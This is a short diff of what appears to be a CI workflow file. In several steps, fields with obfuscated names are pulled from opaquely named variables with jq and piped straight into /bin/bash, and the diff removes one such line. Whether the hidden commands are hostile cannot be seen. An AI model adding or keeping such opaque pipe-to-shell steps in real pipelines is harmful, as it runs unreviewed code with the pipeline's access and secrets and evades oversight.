@@ -31,7 +31,6 @@ jobs:
           echo $adho501 | jq -r .xfcue67 | /bin/bash
           echo $b51386 | jq -r .q93 | /bin/bash
           echo $k841 | jq -r .egmx6143 | /bin/bash
-          printf '%s' "$nunlt57" | jq -r .uza64 | /bin/bash
 
       - name: Save archive
         if: always()
